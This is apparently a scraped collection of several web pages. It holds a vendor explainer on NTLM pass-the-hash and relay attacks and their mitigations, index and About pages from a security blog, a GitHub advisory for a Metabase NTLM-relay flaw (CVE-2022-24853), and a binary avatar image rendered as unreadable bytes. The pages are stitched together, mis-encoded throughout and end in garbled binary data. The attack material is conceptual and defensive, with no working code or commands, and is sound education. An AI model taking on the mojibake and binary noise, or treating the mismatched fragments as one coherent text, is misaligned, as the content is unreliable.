NTLM is vulnerable for a number of reasons. First and foremost, because it does not support modern cryptographic methods such as AES or SHA-256. That makes it vulnerable to offline cracking attacks using tools such as HashCat. Also, NTLMâ€™s hash values can be matched up with alphanumeric passwords using so-called â€œ[rainbow tables](https://en.wikipedia.org/wiki/Rainbow_table?ref=qomplx.com)â€ of passwords and hashes compiled from previous data leaks. Particularities about how NTLM creates password hashes combined with the use of rainbow tables and distributed computing systems mean that NTLM hashes for passwords of any length can be cracked in minutes to hours - and at little cost to attackers.

Even without a rainbow table, hashes can be used in lieu of actual alphanumeric passwords as part of so-called â€œPass the Hashâ€ attacks. In other words: attackers who steal NTLM password hashes can authenticate to network resources without knowing the actual password from which the hash was created. Microsoft and other tech giants long ago mandated that vendors and IT organizations deprecate RC4, SHA-1, and other weak algorithms. Despite this, NTLM is still used for local authentication on Windows systems and storage of Windows passwords on Active Directory Domain Controllers.

## What are NTLM Relay Attacks?

In NTLM, a challenge-response protocol is used for authentication. For any authentication request:

1. NTLM establishes a three-way handshake during client-server authentication with the client establishing a path to the server and negotiating authentication.
2. The server responds to the clientâ€™s negotiation message with a challenge, asking the client to encrypt a sequence of characters using a secret it possesses: a hash of its password.
3. The client sends a response to the server, which contacts a domain authentication service hosted on a domain controller to verify the response.

In a NTLM relay attack, an attacker establishes a position between the client and server on the network and intercepts authentication traffic. Client authentication requests are forwarded to the server by the attacker, similarly challenges are relayed to the client and valid authentication responses to the challenge from the client are sent back to the server, allowing the attackerâ€”rather than the clientâ€”to authenticate using the clientâ€™s credentials.

In relay attacks, the client believes it is negotiating with the target server it wants to authenticate to. The server, meanwhile, believes that the attacker is a legitimate client attempting to authenticate.

This risk of relay attacks was amplified in October 2019, when Microsoft [patched two critical vulnerabilities in all versions of NTLM](https://www.bleepingcomputer.com/news/security/new-microsoft-ntlm-flaws-may-allow-full-domain-compromise/?ref=qomplx.com). Successful exploits could allow an attacker to remotely run code on a Windows machine, or move laterally on the network to critical systems such as servers hosting domain controllers. One vulnerability allows attackers to bypass Message Integrity Code (MIC), a protection implemented by Microsoft that ensures messages sent over a network have not been tampered with.

The bypass can be used in NTLM relay attacks to fool servers into not enforcing signing during authentication negotiations. The second flaw also allows for bypasses of MIC and can be abused during NTLM relay attacks to authenticate to Active Directory Federation Services and potentially access user credentials.

## Mitigations and Protections From NTLM Relay Attacks

There are a number of work arounds and changes that can remove the risk of NTLM relay attacks.

### Use Kerberos

The biggest step organizations can take to eliminate the threat of NTLM relay attacks is to stop using NTLM. Kerberos, a byproduct of MITâ€™s Project Athena, has been Microsoftâ€™s preferred replacement for NTLM since the release of the Windows 2000 platform. In contrast to NTLM, Kerberos uses mutual authentication between the client and server rather than NTLMâ€™s challenge-response. Clients must be part of a domain and have access to a domain controller in order to attempt authentication. With NTLM, clients contact the server, which then contacts the domain controller.

Using Kerberos, client authentication begins with communication to an authentication server which then contacts a Kerberos key distribution center that issues a ticket granting ticket (TGT) encrypted with the ticket granting serviceâ€™s secret. As the client needs access to network services and resources, the TGT is passed along and a request is made to access the service. Once the TGT is verified, session tickets are issued to the client, which now has access to the service.

Kerberos has been a fixture in Windows Server for two decades and is more secure than NTLM, which suffers from a number of native vulnerabilities, including a lack of server authentication and weak cryptography, in addition to slower performance compared to Kerberos.

### Patch & Update Configurations to Mitigate Relay Attacks

Microsoft recommends running all systems at current patch levels and that organizations ensure that a number of specific configurations are secure, including:

* Turning on SMB signings to blunt NTLM relay attacks
* Enforcing LDAP signing and LDAPS channel binding on domain controllers
* Enabling Enhanced Protection for Authentication to mitigate NTLM relay attacks on ADFS and web servers
* Configure ADFS and web servers to accept only requests where EPA is turned on

### Instrument and Validate Kerberos and Active Directory

Technologies such as Kerberos need to be fully instrumented and monitored to prevent a wide range of other popular attacks including Golden- and Silver Ticket attacks. [QOMPLXâ€™s Q:Cyber Identity Assurance](https://www.qomplx.com/cyber/) can help organizations do just that. It maintains a real-time stateful ledger of all appropriately issued and valid Kerberos tickets and observes Kerberos interactions across clients (principals), domain controllers (key distribution centers) and Kerberized services.

Finally, as Active Directory attacks become more common external validation of the Kerberos protocol becomes essential to assure IT teams that every ticket presented by a Kerberos service client was in fact issued by a legitimate key distribution center. QOMPLXâ€™s technology can verify, in near real-time, that a given Kerberos authentication event was correctly generated and that it is linked to legitimate user interactions and the issuing domain controller. This type of deterministic verification makes it difficult for attackers to abuse authentication protocols and processes.

## Additional Reading

Here are the previous entries in our QOMPLX Knowledge series; look for more in our QOMPLX Knowledge series in the days and weeks ahead:

[QOMPLX Knowledge: Golden Ticket Attacks Explained](https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/)

[QOMPLX Knowledge: Silver Ticket Attacks Explained](https://www.qomplx.com/qomplx-knowledge-silver-ticket-attacks-explained/)

[QOMPLX Knowledge: Responding to Golden Ticket Attacks](https://www.qomplx.com/qomplx-knowledge-responding-to-a-golden-ticket-attack/)

[QOMPLX Knowledge: DCSync Attacks Explained](https://www.qomplx.com/kerberos_dcsync_attacks_explained/)

[QOMPLX Knowledge: DCShadow Attacks Explained](https://www.qomplx.com/qomplx-knowledge-active-directory-dcshadow-attacks-explained/)

[QOMPLX Knowledge: Pass-the-Ticket Attacks Explained](https://www.qomplx.com/qomplx-knowledge-pass-the-ticket-attacks-explained/)

[QOMPLX Knowledge: Kerberoasting Attacks Explained](https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/)

[QOMPLX Knowledge: Kerberos Delegation Attacks Explained](https://www.qomplx.com/qomplx-knowledge-kerberos-delegation-attacks-explained/)

[QOMPLX Knowledge: 10 Active Directory Health Checks You Should Know](https://www.qomplx.com/qomplx-knowledge-10-active-directory-health-checks-you-should-know/)

QOMPLX Knowledge: Fundamentals of [Active Directory Trust](https://www.qomplx.com/qomplx-knowledge-fundamentals-of-active-directory-trust-relationships/) Relationships

## Other Resources

[ManageEngine: NTLM Vulnerabilities that Make you Susceptible to Relay Attacks](https://blogs.manageengine.com/active-directory/adauditplus/2019/09/06/ntlm-vulnerabilities-that-make-you-susceptible-to-relay-attacks.html?ref=qomplx.com)

[ManageEngine: Active Directory Authentication Protocols and Security Risks](https://blogs.manageengine.com/active-directory/2019/08/13/active-directory-authentication-protocols-and-security-risks.html?ref=qomplx.com)

[OWASP: Offensive Active Directory 101](https://owasp.org/www-pdf-archive/OWASP_FFM_41_OffensiveActiveDirectory_101_MichaelRitter.pdf?ref=qomplx.com)

[Hackndo: NTLM Relay](https://en.hackndo.com/ntlm-relay/?ref=qomplx.com)

## You might also be interested in

[![Lessons from the Medibank breach](/content/images/2023/05/medibank-breach-banner.jpg)

May 23, 2023

* Attack Surface Monitoring
* Cyber Attacks
* Cyber Operations
* Detections
* QOMPLX Knowledge
* Ransomware
* ITDR

#### Lessons from the Medibank breach

Ming Fu, a member of the Americas Pre-Sales Engineering Team at QOMPLX, looks at the much publicized Medibank breach in Australia last year, and draws a few much needed lessons based on the published findings of this breach.

 Read more](/blog/lessons-from-the-medibank-breach/)

[![IcedID Malware Gaining Prominence by Adding Identity Attack Chains](/content/images/2023/04/IcedID-blog-cover-1.jpg)

Apr 20, 2023

* Cyber Attacks
* Detections
* QOMPLX Knowledge
* Ransomware
* ITDR

#### IcedID Malware Gaining Prominence by Adding Identity Attack Chains

Brian Freedman, WW Director of Solution Architecture highlights how identity controls are necessary tools, along with EDR, to combat evolving malware threats that have been expanding to include identity compromise as a primary objective in their attack strategies.

 Read more](/blog/known-malware-gaining-prominence-by-adding-identity-attack-chains/)

[![QOMPLX Knowledge: OverPass The Hash Attacks](/content/images/2021/09/overpass.jpg)

Aug 19, 2021

#### QOMPLX Knowledge: OverPass The Hash Attacks

OverPass The Hash (OPtH) is a form of credential theft- and reuse attack that is one of the most common methods of lateral movement within compromised IT environments.

 Read more](/blog/qomplx-knowledge-overpass-the-hash-attacks/)

![Request a Demo](https://www.qomplx.com/content/images/newsletter-bg.png)

## Interested in learning more?

Subscribe today to stay informed and get regular updates from QOMPLX.

[![Qomplx](https://www.qomplx.com/content/images/qomplx-logo-footer.svg)](/)

QOMPLX harnesses data to provide unified visibility into cyber risks and trust in identity.

* Products
  + [Identity Threat Detection and Response (ITDR)](https://www.qomplx.com/itdr/)
  + [Managed Detection and Response](https://www.qomplx.com/mdr/)
  + [Attack Surface Monitoring](https://www.qomplx.com/attack-surface-monitoring/)

* Services
  + [Offensive Security Services](https://www.qomplx.com/offensive-security-services/)
  + [Active Directory Security Assessment](https://www.qomplx.com/active-directory-security-assessment/)
  + [vCISO](https://www.qomplx.com/vciso/)

* Resources
  + [Blog](https://www.qomplx.com/blog/)
  + [Content hub](https://www.qomplx.com/resources/)
  + [Case studies](https://www.qomplx.com/resources/case-studies/)
  + [Data sheets](https://www.qomplx.com/resources/datasheets/)
  + [Overviews](https://www.qomplx.com/resources/overview/)
  + [Tech specs](https://www.qomplx.com/resources/technical-specification/)
  + [Videos](https://www.qomplx.com/resources/videos/)
  + [Webinars](https://www.qomplx.com/resources/webinar/)
  + [Whitepapers](https://www.qomplx.com/resources/whitepapers/)

* Company
  + [About QOMPLX](https://www.qomplx.com/about-qomplx/)
  + [Newsroom](https://www.qomplx.com/news/)
  + [Events](https://www.qomplx.com/events/)
  + [Contact Us](https://www.qomplx.com/contact-us/)
  + [Request a demo](https://www.qomplx.com/request-a-demo/)
  + [Vulnerability Disclosure Policy](https://www.qomplx.com/vulnerability-disclosure-policy/)

Â© 2023 QOMPLX. All Rights Reserved.

[Privacy Policy](https://www.qomplx.com/privacy-policy/)
[Terms of Use](https://www.qomplx.com/terms-of-service-agreement/)
[Sitemap](https://www.qomplx.com/sitemap/)



=== Content from secure77.de_8fd76468_20250115_210723.html ===


[![Secure77](https://secure77.de/wp-content/uploads/2022/09/Zeichenflaeche-1white.png)](https://secure77.de/)

[Toggle Side Menu](#sidr)

* [Home](https://secure77.de/home/)
* [Notes](https://notes.secure77.de)
* [Subjects](https://secure77.de/category/subjects/)
  + [Researches](https://secure77.de/category/subjects/researches/)
  + [Sheets](https://secure77.de/category/subjects/sheets/)
  + [Misc](https://secure77.de/category/subjects/misc/)
* [Development](https://secure77.de/category/development/)
  + [Projects](https://secure77.de/category/development/projects/)
  + [Perlite](https://secure77.de/perlite/)
  + [Scripts / Tools](https://secure77.de/category/development/scripts/)
* [Links](https://secure77.de/links-partner/)
* [Impressum](https://secure77.de/impressum/)
* [About Me](https://secure77.de/about-me/)

# [Secure77](https://secure77.de/)

Techblog and Security

[â˜° list view](/home)

[## How to Patch a Android Unity Game

![](https://secure77.de/wp-content/uploads/2024/07/Pasted-image-20231007145500.png)](https://secure77.de/how-to-patch-a-android-unity-game/)

[## How to mod a simple Android App

![](https://secure77.de/wp-content/uploads/2024/06/Pasted-image-20231006162855.png)](https://secure77.de/how-to-mod-a-simple-android-app/)

[## GOG Galaxy â€“ CVE-2022-31262

![](https://secure77.de/wp-content/uploads/2022/04/image-16.png)](https://secure77.de/gog-galaxy-cve-2022-31262/)

[## Hunting for LPEs in Gaming Software

![](https://secure77.de/wp-content/uploads/2022/04/image-4.png)](https://secure77.de/hunting-for-lpes-in-gaming-software/)

[## RE: DC-932L Reversing a Webcam Part 3 â€“ Building the Firmware

![](https://secure77.de/wp-content/uploads/2022/05/image-10.png)](https://secure77.de/re-d-link-dc-932l-webcam-building-the-firmware/)

[## RE: DC-932L Reversing a Webcam Part 2 â€“ Extracting the Firmware

![](https://secure77.de/wp-content/uploads/2022/05/Pasted-image-20220502211412.png)](https://secure77.de/re-d-link-dc-932l-webcam-extracting-the-firmware/)

[## RE: DC-932L Reversing a Webcam Part 1 â€“ Getting a Shell

![](https://secure77.de/wp-content/uploads/2022/05/image-1.png)](https://secure77.de/d-link-dcs-932l-webcam-hacking/)

[## How to start with Buffer Overflows (Linux)

![](https://secure77.de/wp-content/uploads/2022/03/2022-03-24-00_14_45-Perlite.png)](https://secure77.de/how-to-start-with-buffer-overflows-linux/)

[## Things I wanted to know before I started with Buffer Overflows

![](https://secure77.de/wp-content/uploads/2022/02/Pasted-image-20211202165432.png)](https://secure77.de/things-i-wanted-to-know-before-i-started-with-buffer-overflows/)

[## NTLM Attack in Metabase CVE-2022-24853

![](https://secure77.de/wp-content/uploads/2021/12/image-9.png)](https://secure77.de/metabase-ntlm-relay-attack/)

## Seitennummerierung der BeitrÃ¤ge

1
[2](https://secure77.de/page/2/)
â€¦
[5](https://secure77.de/page/5/)
[Next Page Â»](https://secure77.de/page/2/)

Copyright Â© 2025 Â· All Rights Reserved Â·
Secure77 Â· Theme: Portfolio Lite by [Organic Themes](http://organicthemes.com/)

This website uses cookies and google analytics. If you continue to use the website, we assume that you agree.OK[DatenschutzerklÃ¤rung](https://secure77.de/datenschutzerklaerung/)



=== Content from secure77.de_06d1d7d7_20250115_210744.html ===


[![Secure77](https://secure77.de/wp-content/uploads/2022/09/Zeichenflaeche-1white.png)](https://secure77.de/)

[Toggle Side Menu](#sidr)

* [Home](https://secure77.de/home/)
* [Notes](https://notes.secure77.de)
* [Subjects](https://secure77.de/category/subjects/)
  + [Researches](https://secure77.de/category/subjects/researches/)
  + [Sheets](https://secure77.de/category/subjects/sheets/)
  + [Misc](https://secure77.de/category/subjects/misc/)
* [Development](https://secure77.de/category/development/)
  + [Projects](https://secure77.de/category/development/projects/)
  + [Perlite](https://secure77.de/perlite/)
  + [Scripts / Tools](https://secure77.de/category/development/scripts/)
* [Links](https://secure77.de/links-partner/)
* [Impressum](https://secure77.de/impressum/)
* [About Me](https://secure77.de/about-me/)

# [Secure77](https://secure77.de/)

Techblog and Security

[â˜° list view](/home)

[## How to Patch a Android Unity Game

![](https://secure77.de/wp-content/uploads/2024/07/Pasted-image-20231007145500.png)](https://secure77.de/how-to-patch-a-android-unity-game/)

[## How to mod a simple Android App

![](https://secure77.de/wp-content/uploads/2024/06/Pasted-image-20231006162855.png)](https://secure77.de/how-to-mod-a-simple-android-app/)

[## GOG Galaxy â€“ CVE-2022-31262

![](https://secure77.de/wp-content/uploads/2022/04/image-16.png)](https://secure77.de/gog-galaxy-cve-2022-31262/)

[## Hunting for LPEs in Gaming Software

![](https://secure77.de/wp-content/uploads/2022/04/image-4.png)](https://secure77.de/hunting-for-lpes-in-gaming-software/)

[## RE: DC-932L Reversing a Webcam Part 3 â€“ Building the Firmware

![](https://secure77.de/wp-content/uploads/2022/05/image-10.png)](https://secure77.de/re-d-link-dc-932l-webcam-building-the-firmware/)

[## RE: DC-932L Reversing a Webcam Part 2 â€“ Extracting the Firmware

![](https://secure77.de/wp-content/uploads/2022/05/Pasted-image-20220502211412.png)](https://secure77.de/re-d-link-dc-932l-webcam-extracting-the-firmware/)

[## RE: DC-932L Reversing a Webcam Part 1 â€“ Getting a Shell

![](https://secure77.de/wp-content/uploads/2022/05/image-1.png)](https://secure77.de/d-link-dcs-932l-webcam-hacking/)

[## How to start with Buffer Overflows (Linux)

![](https://secure77.de/wp-content/uploads/2022/03/2022-03-24-00_14_45-Perlite.png)](https://secure77.de/how-to-start-with-buffer-overflows-linux/)

[## Things I wanted to know before I started with Buffer Overflows

![](https://secure77.de/wp-content/uploads/2022/02/Pasted-image-20211202165432.png)](https://secure77.de/things-i-wanted-to-know-before-i-started-with-buffer-overflows/)

[## NTLM Attack in Metabase CVE-2022-24853

![](https://secure77.de/wp-content/uploads/2021/12/image-9.png)](https://secure77.de/metabase-ntlm-relay-attack/)

## Seitennummerierung der BeitrÃ¤ge

1
[2](https://secure77.de/page/2/)
â€¦
[5](https://secure77.de/page/5/)
[Next Page Â»](https://secure77.de/page/2/)

Copyright Â© 2025 Â· All Rights Reserved Â·
Secure77 Â· Theme: Portfolio Lite by [Organic Themes](http://organicthemes.com/)

This website uses cookies and google analytics. If you continue to use the website, we assume that you agree.OK[DatenschutzerklÃ¤rung](https://secure77.de/datenschutzerklaerung/)



=== Content from secure77.de_3020731c_20250115_210729.html ===


[![Secure77](https://secure77.de/wp-content/uploads/2022/09/Zeichenflaeche-1white.png)](https://secure77.de/)

[Toggle Side Menu](#sidr)

* [Home](https://secure77.de/home/)
* [Notes](https://notes.secure77.de)
* [Subjects](https://secure77.de/category/subjects/)
  + [Researches](https://secure77.de/category/subjects/researches/)
  + [Sheets](https://secure77.de/category/subjects/sheets/)
  + [Misc](https://secure77.de/category/subjects/misc/)
* [Development](https://secure77.de/category/development/)
  + [Projects](https://secure77.de/category/development/projects/)
  + [Perlite](https://secure77.de/perlite/)
  + [Scripts / Tools](https://secure77.de/category/development/scripts/)
* [Links](https://secure77.de/links-partner/)
* [Impressum](https://secure77.de/impressum/)
* [About Me](https://secure77.de/about-me/)

[Secure77](https://secure77.de/)

Techblog and Security

# About Me

Security researcher and flag collector (OSCP, OSWP, PNPT)

Discord: @sec77

Email: sec77 at secure77.de

Github: <https://github.com/secure-77>

[![](https://www.hackthebox.eu/badge/image/274457)](https://app.hackthebox.eu/profile/274457)

Design: Child Theme based on [Portfolio Lite](https://organicthemes.com/demo/portfolio-lite/blog/)

â›Œ
Search

### #TAGS

[AD (1)](https://secure77.de/tag/ad/)
[Android (1)](https://secure77.de/tag/android/)
[Arduino (3)](https://secure77.de/tag/arduino/)
[C# (1)](https://secure77.de/tag/c-2/)
[cracking (1)](https://secure77.de/tag/cracking/)
[css (1)](https://secure77.de/tag/css/)
[Decryption (1)](https://secure77.de/tag/decryption/)
[ESP8266 (2)](https://secure77.de/tag/esp8266/)
[Exploit (2)](https://secure77.de/tag/exploit/)
[Frida (1)](https://secure77.de/tag/frida/)
[gaming (1)](https://secure77.de/tag/gaming/)
[HTB (10)](https://secure77.de/tag/htb/)
[Kerberos (1)](https://secure77.de/tag/kerberos/)
[Linux (5)](https://secure77.de/tag/linux/)
[MySQL (1)](https://secure77.de/tag/mysql/)
[Network (2)](https://secure77.de/tag/network/)
[NTLM (1)](https://secure77.de/tag/ntlm/)
[PHP (5)](https://secure77.de/tag/php/)
[Powershell (2)](https://secure77.de/tag/powershell/)
[Python (3)](https://secure77.de/tag/python/)
[RE (1)](https://secure77.de/tag/reverse-engineering/)
[Setup (2)](https://secure77.de/tag/setup/)
[SQLI (1)](https://secure77.de/tag/sqli/)
[SSH (3)](https://secure77.de/tag/ssh/)
[VPN (1)](https://secure77.de/tag/vpn/)
[Web Shell (2)](https://secure77.de/tag/web-shell/)
[Windows (11)](https://secure77.de/tag/windows/)
[WLAN (2)](https://secure77.de/tag/wlan/)
[WOL (3)](https://secure77.de/tag/wol/)
[Wordpress (2)](https://secure77.de/tag/wordpress/)

Copyright Â© 2025 Â· All Rights Reserved Â·
Secure77 Â· Theme: Portfolio Lite by [Organic Themes](http://organicthemes.com/)

This website uses cookies and google analytics. If you continue to use the website, we assume that you agree.OK[DatenschutzerklÃ¤rung](https://secure77.de/datenschutzerklaerung/)



=== Content from github.com_ce03b407_20250115_210727.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetabase%2Fmetabase%2Fsecurity%2Fadvisories%2FGHSA-5cfq-582c-c38m)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetabase%2Fmetabase%2Fsecurity%2Fadvisories%2FGHSA-5cfq-582c-c38m)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=metabase%2Fmetabase)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[metabase](/metabase)
/
**[metabase](/metabase/metabase)**
Public

* [Notifications](/login?return_to=%2Fmetabase%2Fmetabase) You must be signed in to change notification settings
* [Fork
  5.2k](/login?return_to=%2Fmetabase%2Fmetabase)
* [Star
   39.4k](/login?return_to=%2Fmetabase%2Fmetabase)

* [Code](/metabase/metabase)
* [Issues
  4k](/metabase/metabase/issues)
* [Pull requests
  376](/metabase/metabase/pulls)
* [Actions](/metabase/metabase/actions)
* [Projects
  0](/metabase/metabase/projects)
* [Wiki](/metabase/metabase/wiki)
* [Security](/metabase/metabase/security)
* [Insights](/metabase/metabase/pulse)

Additional navigation options

* [Code](/metabase/metabase)
* [Issues](/metabase/metabase/issues)
* [Pull requests](/metabase/metabase/pulls)
* [Actions](/metabase/metabase/actions)
* [Projects](/metabase/metabase/projects)
* [Wiki](/metabase/metabase/wiki)
* [Security](/metabase/metabase/security)
* [Insights](/metabase/metabase/pulse)

# Make GeoJSON URL read fully conditional on validation

Low

[diogormendes](/diogormendes)
published
GHSA-5cfq-582c-c38m
Apr 14, 2022

## Package

Metabase OSS and Enterprise
(Metabase)

## Affected versions

<x.42.3 <x.41.6, <x.40.7

## Patched versions

0.42.4,1.42.4,0.41.7,1.41.7,0.40.8,1.40.8

## Description

### Impact

Metabase has a proxy to load arbitrary URLs for JSON maps as part of our GeoJSON support. While we do validation to not return contents of arbitrary URLs, there is a case where a particularly crafted request could result in file access on windows, which allows enabling an [NTLM relay attack](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/), potentially allowing an attacker to receive the password hash.

### Patches

The following patches (or greater versions) are available:

* 0.42.4 and 1.42.4
* 0.41.7 and 1.41.7
* 0.40.8 and 1.40.8

If you use host Metabase in a Windows environment, then it's advised to upgrade.

All releases are available on <https://github.com/metabase/metabase/releases>

### Credits

Reported by <https://github.com/secure-77> via security@ email

### Severity

Low

### CVE ID

CVE-2022-24853

### Weaknesses

[CWE-294](/advisories?query=cwe%3A294)

### Credits

* [![@secure-77](https://avatars.githubusercontent.com/u/31564517?s=40&v=4)](/secure-77)
  [secure-77](/secure-77)
  Analyst

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from avatars.githubusercontent.com_3096e1d6_20250115_210752.html ===
ï¿½ï¿½ï¿½ï¿½ ï¿½  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222ï¿½ï¿½  ( (" ï¿½ï¿½ï¿½          
   } !1AQa"q2ï¿½ï¿½ï¿½#Bï¿½ï¿½Rï¿½ï¿½$3brï¿½
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½       
  w !1AQaq"2ï¿½Bï¿½ï¿½ï¿½ï¿½ #3Rï¿½brï¿½
$4ï¿½%ï¿½&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½   ? ï¿½ï¿½($ I8ï¿½5Kï¿½cKï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ \_ï¿½wÇž;ï¿½ï¿½ï¿½ï¿½3Ë§ï¿½ï¿½]Jc%eÙ³ ï¿½9ï¿½ ï¿½W\_ï¿½Wï¿½|cï¿½ï¿½\_ï¿½{=ÅŒï¿½\>ï¿½2ÜŸ)ï¿½apUï¿½{6ï¿½5ï¿½ï¿½=ï¿½~%ï¿½Nï¿½z$
:F ï¿½Äˆ0sï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(ï¿½Mï¿½ "$ï¿½ï¿½Tï¿½ï¿½#ï¿½ï¿½ï¿½-ï¿½ï¿½ï¿½?
ï¿½ï¿½ï¿½x-.ï¿½{ï¿½0ï¿½8F9ï¿½x>ï¿½ï¿½Wï¿½5ï¿½|?ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½+ï¿½ï¿½[ï¿½>ï¿½ï¿½ï¿½ ï¿½7ï¿½ï¿½ï¿½ï¿½ï¿½]Dï¿½xï¿½I`ï¿½mn-ï¿½ï¿½Sï¿½yeO?
ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½]$ï¿½r&ï¿½ï¿½ï¿½ï¿½qï¿½?OHï¿½?ï¿½ï¿½\_ï¿½ï¿½Xï¿½ï¿½iï¿½kEï¿½fvï¿½ï¿½gRï¿½ï¿½ï¿½|ï¿½ï¿½.zAï¿½jko
ï¿½ï¿½+;-ï¿½ï¿½4lï¿½s[ï¿½!mï¿½ï¿½ï¿½;ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½Mï¿½ï¿½aï¿½ï¿½ï¿½ï¿½Ö@gï¿½Zkï¿½
ï¿½ï¿½$ï¿½5ï¿½ï¿½ï¿½.vï¿½ï¿½;ï¿½hQ@
ï¿½ï¿½ï¿½Cï¿½pï¿½ï¿½vï¿½Kï¿½ 6ï¿½ï¿½ï¿½ï¿½2}k~ï¿½( ï¿½ï¿½(ï¿½ï¿½
